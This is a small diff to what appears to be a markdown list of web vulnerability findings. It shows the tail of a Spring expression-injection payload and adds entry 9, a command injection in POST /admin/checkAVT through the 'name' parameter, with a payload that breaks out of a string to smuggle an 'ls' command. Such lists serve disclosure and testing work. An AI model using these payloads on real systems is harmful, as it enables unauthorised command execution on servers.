@@ -174,3 +174,8 @@ T(org.apache.commons.io.IOUtils).toString(
     T(java.nio.charset.StandardCharsets).UTF_8.name()
     )
 ```
+
+### 9 POST "/admin/checkAVT"
+- Bug: Commant injection
+- Params: name
+- Payload: name= ss')){echo 1;}else{ls;};if(('1
